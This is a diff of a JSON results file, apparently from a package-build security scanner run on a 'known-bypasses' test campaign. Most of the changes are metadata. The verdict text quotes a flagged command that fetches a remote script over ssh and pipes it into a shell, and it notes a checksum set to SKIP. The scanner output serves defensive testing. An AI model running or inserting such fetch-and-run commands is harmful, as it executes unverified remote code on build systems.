@@ -3,6 +3,7 @@
   "cost": {},
   "db_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
   "diff_sha256": "sha256:ccb031e59e6e9b60f0014ca9a78914670cb169b249c4b64e9841aeff5935514c",
+  "environment_ref": "campaign.yml#environment",
   "generator": {
     "directory": "campaigns/known-bypasses-manual/manual",
     "inputs": 8,
@@ -21,7 +22,7 @@
       "chain": "ssh -> pipe -> shell",
       "preserved": true,
       "reason": "",
-      "validator_version": "sha256:1cf585b73235c107a8ce4c9757d7ad27636bed9d18eda3a4d33f074001b0b198"
+      "validator_version": "sha256:368bb45c32cc6123445b114f08f7e3b11774bd130049ec160f3ebbcc966b6025"
     },
     "constraints": {
       "honored": true,
@@ -34,6 +35,7 @@
     "syntax": {
       "bash_n_new": 0,
       "bash_n_old": 0,
+      "bash_path": "/usr/bin/bash",
       "reason": ""
     }
   },
@@ -184,6 +186,6 @@
       "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. no structural changes. Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh [X009]; checksum set to SKIP [R004]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 753
+    "wall_clock_ms": 750
   }
 }
